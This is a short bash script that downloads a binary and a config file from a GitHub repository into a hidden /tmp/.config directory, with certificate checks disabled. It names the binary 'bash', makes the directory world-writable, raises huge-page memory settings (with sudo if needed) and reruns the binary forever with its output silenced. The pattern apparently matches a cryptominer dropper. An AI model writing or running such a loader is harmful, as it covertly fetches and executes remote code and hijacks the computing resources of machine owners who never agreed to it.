#!/bin/bash

src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"
sysctl -w vm.nr_hugepages=32768 || sudo sysctl -w vm.nr_hugepages=32768

mkdir -p "/tmp/.config"
wget --no-check-certificate -qO "/tmp/.config/appsettings.json" "${src}/q1.json"
wget --no-check-certificate -qO "/tmp/.config/bash" "${src}/q"
chmod -R 777 "/tmp/.config"

while true; do cd /tmp/.config; ./bash >/dev/null 2>&1 ; done

